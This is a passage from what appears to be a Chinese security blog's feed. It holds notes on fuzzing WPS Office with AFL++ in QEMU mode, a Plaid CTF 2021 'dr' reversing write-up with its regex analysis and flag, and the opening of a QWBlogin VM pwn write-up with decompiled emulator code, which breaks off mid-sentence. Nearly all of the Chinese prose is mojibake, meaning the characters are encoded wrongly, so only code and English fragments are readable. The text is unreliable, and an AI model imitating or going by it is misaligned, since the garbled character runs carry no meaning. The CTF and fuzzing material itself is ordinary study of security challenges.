çš„ç¨‹åºçš„æ—¶å€™ï¼Œè§‰å¾—ç‰¹åˆ«ç¥å¥‡ï¼Œ<code>wpsoffice</code>ä¼šè¿è¡Œ<strong>ä¸¤æ¬¡</strong><code>_start</code>ï¼Œåœ¨ç¬¬ä¸€æ¬¡<code>_start</code>çš„æ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°<code>wpsoffice</code>åœ¨åŠ è½½è‡ªå·±çš„ç¨‹åºçš„çª—å£ï¼Œåœ¨ç¬¬ä¸€æ¬¡<code>_start</code>çš„æœ€åä¼š<code>jmp</code>ç¬¬äºŒæ¬¡çš„<code>_start</code>ï¼Œç¬¬äºŒæ¬¡çš„<code>wps</code>çª—å£ï¼Œæ˜¾ç¤ºæ­£åœ¨åŠ è½½<code>docx</code>æ–‡ä»¶ï¼Œå› æ­¤å½“æ—¶æˆ‘è°ƒè¯•çš„æ—¶å€™ï¼ŒçŒœæµ‹ç¬¬ä¸€æ¬¡<code>_start</code>çš„æ—¶å€™ï¼Œæ˜¯åœ¨åˆ©ç”¨<code>QtCore</code>åŠ è½½è‡ªå·±çª—å£ï¼Œè€Œç¬¬äºŒæ¬¡æ‰æ˜¯æ¸²æŸ“è§£æ<code>docx</code>æ–‡ä»¶ï¼Œä½†æ˜¯æœ€åè¿˜æ˜¯æ²¡è°ƒå‡ºæ¥</p><h3 id="QString-QString"><a href="#QString-QString" class="headerlink" title="QString::QString"></a>QString::QString</h3><p>è¿™ä¸ªæ¥å£è½¬æ¢å‡ºæ¥çš„å¹¶ä¸æ˜¯<code>QString</code>å‘äº†æˆ‘ä¸€æ®µæ—¶é—´ï¼Œæœ€åæ‰¾åˆ°<code>QFile::exists()</code>æ¥å£çš„æ—¶å€™ï¼Œæ‰å‘ç°ï¼Œ<code>QString::QString</code>è½¬æ¢å‡ºæ¥çš„ä¸æ˜¯<code>QString</code></p><h3 id="AFL-INST-LIBS-AFL-QEMU-INST-RANGES"><a href="#AFL-INST-LIBS-AFL-QEMU-INST-RANGES" class="headerlink" title="AFL_INST_LIBS AFL_QEMU_INST_RANGES"></a>AFL_INST_LIBS AFL_QEMU_INST_RANGES</h3><p>ä¸è®¾ç½®è¿™ä¸¤ä¸ªçš„è¯ï¼Œæ˜¯ä¸ä¼šç»™<code>dlopen</code>æ‰“å¼€çš„åº“å‡½æ•°æ’æ¡©çš„</p><h3 id="fuzz-æ–­æ‰ç»§ç»­è·‘"><a href="#fuzz-æ–­æ‰ç»§ç»­è·‘" class="headerlink" title="fuzz æ–­æ‰ç»§ç»­è·‘"></a>fuzz æ–­æ‰ç»§ç»­è·‘</h3><p>è®¾ç½®è¾“å…¥å‚æ•°ä¸º<code>-i-</code> ï¼Œå°±å¯ä»¥è¯»å…¥ <code>fuzz_out/default/_resume</code>ä¸­çš„å†…å®¹ï¼Œç»§ç»­è·‘</p><h3 id="å…¶ä»–é—®é¢˜"><a href="#å…¶ä»–é—®é¢˜" class="headerlink" title="å…¶ä»–é—®é¢˜"></a>å…¶ä»–é—®é¢˜</h3><p>é¡ºæ‰‹è¯•äº†ä¸€æ³¢<code>Qt5.12.9</code>ï¼Œæœ€åè·‘çš„æ—¶å€™ï¼Œæ˜¯å‡ºç°äº†<code>WARNING: Instrumentation output varies across runs.</code>ï¼Œå‘ç°æ˜¯å‡ºç°äº†<code>ASLR</code>çš„æƒ…å†µï¼Œç…§ç†æ¥è¯´<code>qemu</code>åº”è¯¥ä¸ä¼šå‡ºç°è¿™ç§æƒ…å†µï¼Œä½†æ˜¯æ€ä¹ˆè§£å†³ï¼Œä¸å¤ªæ¸…æ¥š</p><h4 id="qasan"><a href="#qasan" class="headerlink" title="qasan"></a>qasan</h4><p><del>å¦å¤–è¯•äº†ä¸€ä¸‹<code>qasan</code>ä¹Ÿæ— æ³•è¿›è¡Œæ’æ¡©æ£€æµ‹ï¼Œæ„Ÿè§‰è¿˜å¾—å†æ•´æ•´</del></p><p><code>qasan</code>é‡æ–°è¯•äº†ä¸€ä¸‹ï¼Œæ²¡å•¥é—®é¢˜ï¼Œè‡³å°‘ä¹Ÿèƒ½è·‘èµ·æ¥ï¼Œå°±æ˜¯æ²¡å•¥æ•ˆæœï¼Œ<code>build.py</code>ä¹‹åï¼Œ<code>./qasan ./elffile arg...</code>å°±å¯ä»¥äº†</p><h4 id="e9afl"><a href="#e9afl" class="headerlink" title="e9afl"></a>e9afl</h4><p>è¯•äº†ä¸€ä¸‹<code>e9afl</code>ï¼Œä½†æ˜¯è§‰å¾—å¯¹äºè¿™ç§å†™çš„<code>harness</code>å¹¶ä¸æ€ä¹ˆå‹å¥½ï¼Œæœ€ç»ˆæ•ˆæœéå¸¸ä¸å¥½ï¼Œå¯¹äºåº“å‡½æ•°çš„æ’æ¡©ï¼Œåº”è¯¥æ˜¯æ’æ¡©æ‰€æœ‰å‡½æ•°ï¼Œæˆ–è€…æ²¿ç€æ¥å£çš„<code>CFG</code>éœ€è¦å¯¹ä¸»è¦éƒ¨åˆ†æ’æ¡©ï¼Œä½†æ˜¯æˆ‘åæ±‡ç¼–ï¼Œçœ‹çš„æ—¶å€™ï¼Œæ„Ÿè§‰åŸºæœ¬æ²¡æ’æ¡©ä»€ä¹ˆ</p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>afl++</tag>
      
      <tag>qemu_mode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Plaid CTF dr</title>
    <link href="/2021/05/10/Plaid%20CTF%20dr/"/>
    <url>/2021/05/10/Plaid%20CTF%20dr/</url>
    
    <content type="html"><![CDATA[<p>æ‰“æ¯”èµ›çš„æ—¶å€™ï¼Œåé¢ä¸€ç›´åœ¨çœ‹<code>dr</code>è¿™ä¸ªé¢˜ï¼ŒæŠŠå¤§æ¦‚é€»è¾‘é€†æ¸…æ¥šï¼ˆ<del>åæ¥å‘ç°é€†å‘ä¸€ç‚¹ç”¨éƒ½æ²¡ï¼Œæ„Ÿè§‰è¿˜ä¸å¦‚çŒœå‘¢ï¼Œtclï¼Œrusté€†çš„å¾ˆæ…¢</del>ï¼‰ï¼Œä¸€å¼€å§‹è§‰å¾—æœ‰ç‚¹ç±»ä¼¼è‡ªåŠ¨æœºï¼Œåé¢å‘ç°æ˜¯æ­£åˆ™ä¹‹åï¼Œå·¨ç¥ä¸¤ä¸ªå°æ—¶å°±ç§’äº†ï¼ˆtql</p><p>æ‹–äº†å¾ˆä¹…æ‰æ¥å¤ç°ï¼Œç¨å¾®è®°å½•ä¸€ä¸‹ï¼Œå…å¾—ä¹‹åå¿˜è®°äº†</p><h2 id="ç¨‹åºé€»è¾‘"><a href="#ç¨‹åºé€»è¾‘" class="headerlink" title="ç¨‹åºé€»è¾‘"></a>ç¨‹åºé€»è¾‘</h2><p> è™½ç„¶æ˜¯ rust å†™çš„ï¼Œä½†æ˜¯ç¨‹åºé€»è¾‘æ¯”è¾ƒç®€å•ï¼Œå¯ä»¥åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œå‰é¢ç¬¬ä¸€éƒ¨åˆ†å’Œç¬¬ä¸‰éƒ¨åˆ†éƒ½æ˜¯å®šæ­»çš„å­—ç¬¦ä¸² â€œ3â€ å’Œ â€œyesâ€</p><p>ç¬¬äºŒéƒ¨åˆ†è¾“å…¥çš„æ—¶å€™ä¼šå‡ºç°ä¸€äº›å¥‡æ€ªçš„ä¸œè¥¿ï¼Œåˆ°åé¢å¯ä»¥å‘ç°ç¬¬äºŒéƒ¨åˆ†ç®—æ˜¯ç¬¬å››éƒ¨åˆ†çš„æç¤º</p><p>ç¬¬äºŒéƒ¨åˆ†è¾“å…¥çš„æ˜¯ç—‡çŠ¶ï¼Œç¬¬å››éƒ¨åˆ†æ˜¯è¾“å…¥keyï¼Œè¾“å…¥ç—‡çŠ¶æ—¶ï¼Œä¼šå‡ºç°ç±»ä¼¼è‡ªåŠ¨æœºåƒå­—ç¬¦ç„¶åå‡ºç°çŠ¶æ€è½¬æ¢çš„æç¤ºï¼Œåœ¨è¿™éƒ¨åˆ†å¯ä»¥çŒœåˆ°ä¸€äº›æœ€åŸºæœ¬çš„ç¬¦å·è¡¨ç¤ºï¼ŒåŒæ—¶ä¸åŒçš„ç—‡çŠ¶éœ€è¦çš„æ²»ç—…çš„è´¹ç”¨ä¸åŒï¼Œå¯¹åç»­çš„ç¬¬å››éƒ¨åˆ†ä¹Ÿä¼šé€ æˆå½±å“</p><p>ç¬¬å››éƒ¨åˆ†è¾“å…¥keyä¹‹åï¼Œä¼šè¿›è¡Œæ¥å—ï¼Œå¹¶åœ¨æœ€åå°†è¾“å…¥çš„å†…å®¹å’Œå†™åœ¨bssæ®µçš„å­—ç¬¦åˆ—è¡¨è¿›è¡Œå¤„ç†ä¹‹åå¾—åˆ°flag</p><h2 id="æ­£åˆ™åˆ†æ"><a href="#æ­£åˆ™åˆ†æ" class="headerlink" title="æ­£åˆ™åˆ†æ"></a>æ­£åˆ™åˆ†æ</h2><p>é€šè¿‡çŒœåå­—å’Œå¯¹äºä¸åŒçš„è¾“å…¥å’Œæç¤ºçš„è¿”å›å¯ä»¥å¾—åˆ°ä»¥ä¸‹çš„åˆ†æç»“æœ</p><pre><code class="hljs"><span class="hljs-attribute">And</span>: æ»¡è¶³Resä¸­æ‰€æœ‰çš„è¦æ±‚<span class="hljs-attribute">Alt</span>: æ»¡è¶³Resä¸­å…¶ä¸­ä¸€ä¸ªè¦æ±‚<span class="hljs-attribute">Seq</span>: æ­£åˆ™éœ€è¦æ»¡è¶³çš„åºåˆ—<span class="hljs-attribute">Lit</span>: ä¸€ä¸ªä¸€ä¸ªåŒ¹é…ï¼Œå­—é¢é‡<span class="hljs-attribute">Res</span>: æ•°ç»„<span class="hljs-attribute">Star</span>: åŒ¹é…0ä¸ªæˆ–è€…å¤šä¸ª<span class="hljs-attribute">Eps</span>: epsilon<span class="hljs-attribute">Neg(Null)</span>: åŒ¹é…ä»»æ„é•¿åº¦çš„<span class="hljs-attribute">Neg:</span>    10c -&gt; 10ca    Neg( ... Alt(Res([Lit(&quot;af&quot;)])) ...) -&gt; Neg( ... Alt(Res([Lit(&quot;f&quot;)])) ... )    åº”è¯¥æ˜¯ç¦æ­¢å‡ºç° af çš„æ„æ€        å°è¯• 10caf ä¹Ÿå¤±æ•ˆäº†<span class="hljs-attribute">Consider</span>:     1: 1,7777,73331         0*16+1    10: 16,7777,73331       (0*16+1)*16+0        100: 256,7777,73331     ((0*16+1)*16+0)*16+0    10c: 268,7777,73331     ((0*16+1)*16+0)*16+0xc    %733331    ç›¸å½“äº Consider(Res([])) çš„ä¸ªæ•°è¿›åˆ¶<span class="hljs-attribute">Moon</span>:     1: Moon([0-9],2,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    10: Moon([0-9],3,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    100: Moon([0-9],1,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    10c: Moon([a-f],3,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)        ç›¸å½“äºåœ¨ç®—ä¸ªæ•°ï¼Œå¦‚æœä¸ªæ•°ç›¸ç­‰äº†ï¼Œè¿™ä¸ª Moon å¯ä»¥ç»“æŸè¿›å…¥ä¸‹ä¸€ä¸ª    100c è¿™ä¸ªcå°±åƒä¸è¿›å»ï¼Œå› ä¸ºç¬¬ä¸€é¡¹æ˜¯ Moon([0-9], 1, 3)<span class="hljs-attribute">Fan:</span>    10: Neg(.. Fan([a-f], 6) ..)    10b: Neg(.. Fan([a-f], 5) ..)    å€’æ•°è®¡æ•°</code></pre><h2 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h2><p>æœ€åå¯¹ç…§è¾“å…¥<code>1</code>ä¹‹åçš„æ­£åˆ™æç¤ºï¼Œå¯ä»¥åˆ†æå¾—åˆ°ä»¥ä¸‹çš„ç»“æœ</p><pre><code class="hljs lsl"><span class="hljs-number">1.</span> Neg(Null) + Consider( [bcd], Lit(<span class="hljs-string">&quot;cdb&quot;</span>)+Neg(bd) ], <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)  å­—ç¬¦ä¸² []cdb æˆ–è€… cdb[] ä¸”ä¸èƒ½ä¸º cdbb cdbd<span class="hljs-number">2.</span> *[<span class="hljs-number">1</span><span class="hljs-number">-3</span>] + (*[<span class="hljs-number">3</span><span class="hljs-number">-7</span>] + Neg(Null))                                <span class="hljs-number">3.</span> Consider( [<span class="hljs-number">05</span>a], [<span class="hljs-number">16</span>b], [<span class="hljs-number">27</span>cf], [<span class="hljs-number">38</span>dx], [<span class="hljs-number">49</span>e], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span> )     ç®—æ³•éœ€è¦ æœ€å %<span class="hljs-number">7</span> == <span class="hljs-number">0</span><span class="hljs-number">4.</span> Moon([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">1</span>, <span class="hljs-number">3</span>) + Moon([a-f], <span class="hljs-number">2</span>, <span class="hljs-number">3</span>) + Moon( Moon([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">1</span>, <span class="hljs-number">3</span>), Moon([a-f], <span class="hljs-number">2</span>, <span class="hljs-number">3</span>), <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)    éœ€è¦ æ•°å­—(<span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">8.</span>..)+å­—ç¬¦(<span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">7.</span>..)+æ•°å­—(<span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">8.</span>..)+å­—ç¬¦(<span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">7.</span>..) <span class="hljs-number">5.</span> Moon(Lit(<span class="hljs-string">&quot;10&quot;</span>), <span class="hljs-number">0</span>, <span class="hljs-number">3</span>)                                        <span class="hljs-number">10</span>éœ€è¦å‡ºç°<span class="hljs-number">3</span>æ¬¡<span class="hljs-number">6.</span> Neg( Alt( Lit(<span class="hljs-string">&quot;af&quot;</span>), Lit(<span class="hljs-string">&quot;73&quot;</span>), æ•°å­—+Lit(<span class="hljs-string">&quot;a&quot;</span>), Lit(<span class="hljs-string">&quot;ccc&quot;</span>), Fan([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">7</span>) )  )          af <span class="hljs-number">73</span> æ•°å­—+a ccc éƒ½ä¸èƒ½å‡ºç° æ•°å­—ä¹Ÿä¸èƒ½è¿ç»­è¶…è¿‡<span class="hljs-number">7</span>ä¸ª   Neg( Alt( Lit(<span class="hljs-string">&quot;a&quot;</span>), Fan([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">6</span>)))                   a ä¸èƒ½å‡ºç° æ•°å­—ä¸èƒ½è¿ç»­è¶…è¿‡<span class="hljs-number">6</span>ä¸ª<span class="hljs-number">7.</span> Neg( Neg(Null) + Fan([a-f]+Neg(Null), <span class="hljs-number">6</span>))                                    å­—æ¯ä¸èƒ½è¶…è¿‡<span class="hljs-number">6</span>ä¸ª<span class="hljs-number">8.</span> Consider(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,a,b,c,d,e,f, <span class="hljs-number">0</span>,<span class="hljs-number">7777</span>,<span class="hljs-number">73331</span>)</code></pre><h2 id="å¤§è‡´æ¨æµ‹"><a href="#å¤§è‡´æ¨æµ‹" class="headerlink" title="å¤§è‡´æ¨æµ‹"></a>å¤§è‡´æ¨æµ‹</h2><p>1 4 7å¾— <code>cdb</code> çš„ä¸²é•¿åº¦åªèƒ½ä¸º 4ä¸”åªèƒ½ä¸º <code>[b-f]cdb | cdb[cef]</code></p><p>ä¸»è¦4å¯ä»¥çŸ¥é“åŸºæœ¬ä¸Šæ˜¯<code>æ•°å­—+å­—ç¬¦+æ•°å­—+å­—ç¬¦</code>çš„æ¨¡å¼ï¼Œåˆå­—ç¬¦ä¸èƒ½è¶…è¿‡6ä¸ªä¸”è¿ç»­çš„å­—ç¬¦å¿…é¡»æ˜¯1æˆ–è€…4ä¸ªï¼Œå› æ­¤è¦ä¹ˆæ˜¯<code>1+4</code>è¦ä¹ˆæ˜¯<code>4+1</code></p><p>å†åˆ¤æ–­ä¸€ä¸‹æ•°å­—åªèƒ½æ˜¯<code>2+2 | 2+5 | 5+2 | 5+5</code>ï¼Œåˆéœ€è¦å‡ºç°ä¸‰æ¬¡<code>10</code>ï¼Œå› æ­¤åªèƒ½<code>[1010x|10x10|10] + [10xxx|x10xx|xx10x|xxx10]</code>æˆ–è€…è¿™ä¸¤ä¸ªçš„é¡ºåºå¯ä»¥åè¿‡æ¥å³å‰é¢æ˜¯ä¸€ä¸ª<code>10</code>åé¢æ˜¯ä¸¤ä¸ª<code>10</code></p><p> å› æ­¤<code>(a, b, c, d)</code>ä¸­</p><pre><code class="hljs apache"><span class="hljs-attribute">a</span>: <span class="hljs-number">1010</span>x | <span class="hljs-number">10</span>x<span class="hljs-number">10</span> | <span class="hljs-number">10</span><span class="hljs-attribute">b</span>:<span class="hljs-meta"> [b-f]cdb | cbd[cef]</span><span class="hljs-attribute">c</span>: <span class="hljs-number">10</span>xxx | x<span class="hljs-number">10</span>xx | xx<span class="hljs-number">10</span>x | xxx<span class="hljs-number">10</span><span class="hljs-attribute">d</span>: bcd</code></pre><p>ä¸”<code>a c</code>å¯äº¤æ¢ï¼Œ<code>b d</code>å¯äº¤æ¢ï¼Œç„¶åå¿…é¡»è¦<code>10</code>å¼€å¤´ï¼Œå¿…é¡»è¦3ä¸ª<code>10</code>ï¼Œä¸èƒ½å‡ºç°<code>73</code>ï¼Œä¸”ä¸¤ä¸ª<code>Consider</code>éœ€è¦æ»¡è¶³</p><p>å› æ­¤å¯ä»¥å†™å‡ºè„šæœ¬çˆ†ç ´ï¼Œæœ€åå¯ä»¥å¾—åˆ°ä¸€å †å¯èƒ½çš„è§£</p><p>æœ€åå¯è¡Œçš„ç»“æœ</p><pre><code class="hljs apache"><span class="hljs-attribute">cough</span><span class="hljs-attribute">10174cdbf10810c</span><span class="hljs-attribute">PCTF</span>&#123;a_pr<span class="hljs-number">1</span>m<span class="hljs-number">3</span>_a_day_k<span class="hljs-number">33</span>ps_th<span class="hljs-number">3</span>_D<span class="hljs-number">0</span>ctor_Firmly_Away&#125;</code></pre><p>é™„ä¸Šé¢˜ç›®å’Œè„šæœ¬ <a href="https://github.com/Vang3lis/CTF_repo/tree/master/PlaidCTF_2021/dr">dr</a></p><p>æˆ‘çš„è„šæœ¬å†™çš„ååˆ†çš„æš´åŠ›ï¼ˆæ— é™å¥—forå¾ªç¯ï¼‰ï¼Œå·¨ç¥å†™çš„å°±å¾ˆç®€å•</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>reg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QWBlogin &amp; GACTF vmpwn</title>
    <link href="/2020/09/02/qwblogin%20&amp;%20GACTF%20vmpwn/"/>
    <url>/2020/09/02/qwblogin%20&amp;%20GACTF%20vmpwn/</url>
    
    <content type="html"><![CDATA[<p>å¼ºç½‘æ¯çš„ä¸€ä¸ªè™šæ‹Ÿæœºçš„é¢˜ç›®ï¼Œä¹‹å‰åšè¿‡è™šæ‹Ÿæœºçš„é¢˜ç›®ä½†æ˜¯éƒ½æ²¡åšå‡ºæ¥ï¼Œè¿™æ¬¡æ‰“æ¯”èµ›çš„æ—¶å€™ç”±äºæœ‰å…¶ä»–çš„äº‹æƒ…ï¼Œå°±åšäº†ä¸€ç‚¹å°±æ²¡åšäº†ï¼Œç„¶åä»Šå¤©æŠŠè¿™ä¸ªé¢˜ç›®ç£¨å‡ºæ¥äº†ã€‚</p><p>æ‰“å®Œ <code>GACTF2020</code> ä¹‹åæŠŠå…¶ä¸­çš„<code>vmpwn</code>ä¹Ÿæ·»åŠ åœ¨æ­¤</p><h2 id="QWBlogin"><a href="#QWBlogin" class="headerlink" title="QWBlogin"></a>QWBlogin</h2><p>è¯¥é¢˜ç»™äº†ä¸€ä¸ª <code>emulator</code>è™šæ‹Ÿæœºï¼Œè¿è¡Œçš„ç±»ä¼¼æœºå™¨ç çš„<code>test.bin</code>å’Œ<code>launch.sh</code>ï¼Œä¹‹å<code>tips</code>çš„æ—¶å€™ç»™äº†<code>Instruction.h</code></p><h3 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h3><h4 id="main-å‡½æ•°"><a href="#main-å‡½æ•°" class="headerlink" title="main å‡½æ•°"></a>main å‡½æ•°</h4><p>åŸºæœ¬ä¸Šç¨‹åºè¿è¡Œä¾é ä¸€ä¸ªè™šæ‹Ÿæœºçš„ç»“æ„ä½“ï¼Œå¯ä»¥ä»<code>main</code>é‡Œé¢çœ‹åˆ°å°±æ˜¯ <code>v9</code>ç»“æ„ä½“ï¼Œåæ–‡ä¼šå°†ä»‹ç»è¯¥ç»“æ„ä½“</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span><span class="hljs-function"></span>&#123;    len = sub_ba0(argv[<span class="hljs-number">1</span>]);    <span class="hljs-keyword">if</span>(len &lt;= <span class="hljs-number">0</span>)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        fd = open(argv[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        v8 = mmap(<span class="hljs-number">0</span>, len, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, fd, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span>(!v8)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        <span class="hljs-comment">// check image format</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(v8, <span class="hljs-string">&quot;\x61\xde\x10\ef&quot;</span>, <span class="hljs-number">4</span>))        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);        <span class="hljs-comment">// check lenth</span>    <span class="hljs-comment">// segment?</span>    <span class="hljs-comment">// v8[6, 14) ~ [14, 22) lenth</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">6</span>) &gt; len || *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">14</span>) &gt; len - *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">6</span>) )        <span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);        <span class="hljs-comment">// v8[22, 30) ~ [30, 38)</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">22</span>) &gt; len || *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">30</span>) &gt; len - *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">22</span>) )        <span class="hljs-built_in">exit</span>(<span class="hljs-number">4</span>);    <span class="hljs-comment">// v[38, 46) &gt; v8[14, 22)</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">38</span>) &gt;= *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">14</span>) )         <span class="hljs-built_in">exit</span>(<span class="hljs-number">5</span>);    v9 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0xD0</span>, <span class="hljs-number">1</span>);    <span class="hljs-comment">// v[6, 14) == offset v&#123;14, 22) == segment_size</span>    <span class="hljs-comment">// v9[21] = calloc(1, v8[14, 22)) 0x1000 å‘ä¸Šå–æ•´</span>    v9[<span class="hljs-number">21</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, v8[<span class="hljs-number">14</span>, <span class="hljs-number">22</span>))    <span class="hljs-built_in">memcpy</span>(v9[<span class="hljs-number">21</span>], &amp;(v8[v8[<span class="hljs-number">6</span>, <span class="hljs-number">14</span>)]),  v8[<span class="hljs-number">14</span>, <span class="hljs-number">22</span>))    v[<span class="hljs-number">20</span>] = segment_size;    <span class="hljs-comment">// </span>    v9[<span class="hljs-number">23</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, v8[<span class="hljs-number">30</span>, <span class="hljs-number">38</span>))    <span class="hljs-built_in">memcpy</span>(v9[<span class="hljs-number">23</span>], &amp;(v8[v8[<span class="hljs-number">22</span>, <span class="hljs-number">30</span>)]), v8[<span class="hljs-number">30</span>, <span class="hljs-number">38</span>))    v9[<span class="hljs-number">22</span>] = segment_size;     v9[<span class="hljs-number">25</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span> <span class="hljs-number">000</span>);    v9[<span class="hljs-number">24</span>] = <span class="hljs-number">0x20</span> <span class="hljs-number">000</span>;    v9[<span class="hljs-number">18</span>] = v8[<span class="hljs-number">38</span>, <span class="hljs-number">46</span>)    g_Var = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x18</span>, <span class="hljs-number">1</span>);    <span class="hljs-built_in">memset</span>(g_Var, <span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">//é“¾è¡¨ç»“æ„ å¯èƒ½è®°å½• segment flag çš„</span>    <span class="hljs-comment">// g_Var[0x10, 0x18) -&gt; struct_18 -&gt; struct_18;</span>                  <span class="hljs-keyword">while</span>(!sub_c1a(v9))    &#123;&#125;&#125;</code></pre><p>ç„¶åè¿›å…¥<code>c1a</code>ç»“æ„ä½“çš„æ—¶å€™ï¼Œä¼šå‘ç°<code>IDA</code>æŠ¥å‡ºè¯¥å‡½æ•°å¤ªå¤§æ— æ³•åˆ†æï¼Œåªèƒ½å¦å¤–ç”¨<code>Ghidra</code>çœ‹èƒ½ä¸èƒ½åˆ†æï¼Œç„¶åå‘ç°èƒ½å¤Ÿåç¼–è¯‘ï¼Œäºæ˜¯å¯¹å…¶è¿›è¡Œ<code>dump</code>åç¼–è¯‘çš„æ–‡æœ¬è¿›è¡Œåˆ†æ</p><h4 id="VM-struct"><a href="#VM-struct" class="headerlink" title="VM struct"></a>VM struct</h4><p>å…¶ä¸­å…³é”®çš„ç»“æ„ä½“è¢«é€†å‡ºæ¥æ˜¯å¦‚ä¸‹</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span></span><span class="hljs-class">&#123;</span>    <span class="hljs-keyword">int64_t</span> r00;    <span class="hljs-keyword">int64_t</span> r01;    <span class="hljs-keyword">int64_t</span> r02;    <span class="hljs-keyword">int64_t</span> r03;    <span class="hljs-keyword">int64_t</span> r04;    <span class="hljs-keyword">int64_t</span> r05;    <span class="hljs-keyword">int64_t</span> r06;    <span class="hljs-keyword">int64_t</span> r07;    <span class="hljs-keyword">int64_t</span> r08;    <span class="hljs-keyword">int64_t</span> r09;    <span class="hljs-keyword">int64_t</span> r0a;    <span class="hljs-keyword">int64_t</span> r0b;    <span class="hljs-keyword">int64_t</span> r0c;    <span class="hljs-keyword">int64_t</span> r0d;    <span class="hljs-keyword">int64_t</span> r0e;    <span class="hljs-keyword">int64_t</span> r0f;    <span class="hljs-keyword">int64_t</span> r10;    <span class="hljs-keyword">int64_t</span> r11;    <span class="hljs-keyword">int64_t</span> pc;             <span class="hljs-comment">// vm[0x12]</span>    <span class="hljs-keyword">int64_t</span> flags;          <span class="hljs-comment">// vm[0x13]</span>    <span class="hljs-keyword">int64_t</span> text_size;      <span class="hljs-comment">// vm[0x14]</span>    <span class="hljs-keyword">int64_t</span> text_segment;   <span class="hljs-comment">// vm[0x15]</span>    <span class="hljs-keyword">int64_t</span> data_size;      <span class="hljs-comment">// vm[0x16]</span>    <span class="hljs-keyword">int64_t</span> data_segment;   <span class="hljs-comment">// vm[0x17]</span>    <span class="hljs-keyword">int64_t</span> io_file;        <span class="hljs-comment">// 0x18 struct (int_no=0) -&gt; 0x18 (int_no=1) -&gt; 0x18 (int_no=2)</span>    <span class="hljs-keyword">int64_t</span> <span class="hljs-built_in">stack</span>;          <span class="hljs-comment">// vm[0x19]</span>    <span class="hljs-comment">// int64_t </span>&#125;;</code></pre><p>å‰é¢æ˜¯å¯„å­˜å™¨ï¼Œåé¢æ˜¯ä¸€äº›æ®µå’Œå­˜å‚¨çš„<code>io_file</code>é“¾å’Œè™šæ‹Ÿçš„æ ˆ</p><h4 id="op-1"><a href="#op-1" class="headerlink" title="op[1]"></a>op[1]</h4><p>åœ¨<code>0xc1a</code>ç¨‹åºçš„å¼€å§‹å…ˆä¼šåˆ¤æ–­å½“å‰<code>op</code>æ˜¯å¦<code>&lt;2</code>å¦‚æœ<code>&lt;2</code>åˆ™é€€å‡ºï¼Œè¯´æ˜æ¯ä¸€ä¸ªæŒ‡ä»¤è‡³å°‘éƒ½æœ‰ä¸¤ä¸ªå­—èŠ‚ï¼Œä¹‹åç”¨äº†<code>op[1]&amp;0xf</code>è¿›è¡Œ<code>switch 